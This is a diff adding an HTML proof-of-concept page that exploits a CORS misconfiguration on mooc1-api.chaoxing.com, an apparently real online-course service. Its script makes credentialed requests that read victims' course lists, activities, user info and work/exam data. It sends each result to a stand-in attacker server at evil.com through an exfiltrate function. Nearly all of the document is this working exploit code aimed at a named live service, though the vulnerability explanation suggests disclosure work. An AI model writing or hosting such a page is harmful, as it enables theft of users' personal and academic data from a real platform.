@@ -1,0 +1,143 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="UTF-8">
+<title>CORS Data Theft PoC - chaoxing.com</title>
+<style>
+body { font-family: monospace; background: #1a1a2e; color: #e0e0e0; padding: 20px; }
+h1 { color: #e94560; }
+h2 { color: #0f3460; background: #e94560; padding: 8px; display: inline-block; }
+pre { background: #16213e; padding: 12px; border-left: 3px solid #e94560; overflow-x: auto; }
+.critical { color: #e94560; font-weight: bold; }
+.success { color: #4ecca3; }
+.error { color: #e94560; }
+#status { padding: 10px; margin: 10px 0; border: 1px solid #0f3460; }
+</style>
+</head>
+<body>
+<h1>CORS Misconfiguration Exploitation PoC</h1>
+<p>This page demonstrates how an attacker on <span class="critical">evil.com</span> can steal data from
+<strong>mooc1-api.chaoxing.com</strong> due to CORS misconfiguration.</p>
+
+<p class="critical">Vulnerability: The server returns Access-Control-Allow-Origin: &lt;request_origin&gt;
+and Access-Control-Allow-Credentials: true for ANY origin.</p>
+
+<div id="status">Starting exploitation...</div>
+
+<h2>1. Stealing Course List</h2>
+<pre id="courses">Loading...</pre>
+
+<h2>2. Stealing Activity List</h2>
+<pre id="activities">Loading...</pre>
+
+<h2>3. Stealing User Info</h2>
+<pre id="userinfo">Loading...</pre>
+
+<h2>4. Stealing Work/Exam Data</h2>
+<pre id="workdata">Loading...</pre>
+
+<h2>5. Exfiltrated Data Summary</h2>
+<pre id="summary">Waiting for all requests...</pre>
+
+<script>
+const EVIL_SERVER = 'https://evil.com/steal'; // Attacker's server
+const TARGET = 'https://mooc1-api.chaoxing.com';
+const courseId = '257485372';
+const classId = '132821141';
+
+let stolenData = {};
+
+function logStatus(msg) {
+    document.getElementById('status').innerHTML += '<br>' + msg;
+}
+
+// Send stolen data to attacker's server
+function exfiltrate(data, label) {
+    // In a real attack, this would send data to the attacker's server
+    fetch(EVIL_SERVER, {
+        method: 'POST',
+        headers: {'Content-Type': 'application/json'},
+        body: JSON.stringify({label: label, data: data, timestamp: new Date().toISOString()})
+    }).catch(() => {}); // Silent fail - we don't care if the C2 server is down in PoC
+
+    stolenData[label] = data;
+}
+
+// 1. Steal course list
+fetch(TARGET + '/mooc-ans/mycourse/backclazzdata?view=json&m=0', {
+    credentials: 'include',
+    headers: {'Accept': 'application/json'}
+})
+.then(r => r.json())
+.then(data => {
+    document.getElementById('courses').textContent = JSON.stringify(data, null, 2);
+    exfiltrate(data, 'courses');
+    logStatus('<span class="success">[+] Course list stolen successfully!</span>');
+})
+.catch(e => {
+    document.getElementById('courses').textContent = 'Error: ' + e.message;
+    logStatus('<span class="error">[-] Course list theft failed: ' + e.message + '</span>');
+});
+
+// 2. Steal activity list
+fetch(TARGET + '/mooc-ans/ppt/activeAPI/taskactivelist?courseId=' + courseId + '&classId=' + classId, {
+    credentials: 'include',
+    headers: {'Accept': 'application/json'}
+})
+.then(r => r.json())
+.then(data => {
+    document.getElementById('activities').textContent = JSON.stringify(data, null, 2);
+    exfiltrate(data, 'activities');
+    logStatus('<span class="success">[+] Activity list stolen successfully!</span>');
+})
+.catch(e => {
+    document.getElementById('activities').textContent = 'Error: ' + e.message;
+    logStatus('<span class="error">[-] Activity list theft failed: ' + e.message + '</span>');
+});
+
+// 3. Steal user info
+fetch(TARGET + '/mooc-ans/user/info', {
+    credentials: 'include',
+    headers: {'Accept': 'application/json'}
+})
+.then(r => r.json())
+.then(data => {
+    document.getElementById('userinfo').textContent = JSON.stringify(data, null, 2);
+    exfiltrate(data, 'userinfo');
+    logStatus('<span class="success">[+] User info stolen successfully!</span>');
+})
+.catch(e => {
+    document.getElementById('userinfo').textContent = 'Error: ' + e.message;
+    logStatus('<span class="error">[-] User info theft failed: ' + e.message + '</span>');
+});
+
+// 4. Steal work/exam data
+fetch(TARGET + '/mooc-ans/api/work/list?courseId=' + courseId + '&classId=' + classId, {
+    credentials: 'include',
+    headers: {'Accept': 'application/json'}
+})
+.then(r => r.json())
+.then(data => {
+    document.getElementById('workdata').textContent = JSON.stringify(data, null, 2);
+    exfiltrate(data, 'workdata');
+    logStatus('<span class="success">[+] Work/exam data stolen successfully!</span>');
+})
+.catch(e => {
+    document.getElementById('workdata').textContent = 'Error: ' + e.message;
+    logStatus('<span class="error">[-] Work/exam data theft failed: ' + e.message + '</span>');
+});
+
+// Show summary after all requests
+setTimeout(() => {
+    const summary = {
+        totalEndpoints: Object.keys(stolenData).length,
+        stolenCategories: Object.keys(stolenData),
+        attackVector: 'CORS misconfiguration (ACAO reflects origin + ACAC: true)',
+        impact: 'Full data exfiltration of user courses, activities, sign-in records, work, exams',
+    };
+    document.getElementById('summary').textContent = JSON.stringify(summary, null, 2);
+    logStatus('<span class="critical">[!] Data exfiltration complete. All stolen data would be sent to attacker server.</span>');
+}, 5000);
+</script>
+</body>
+</html>
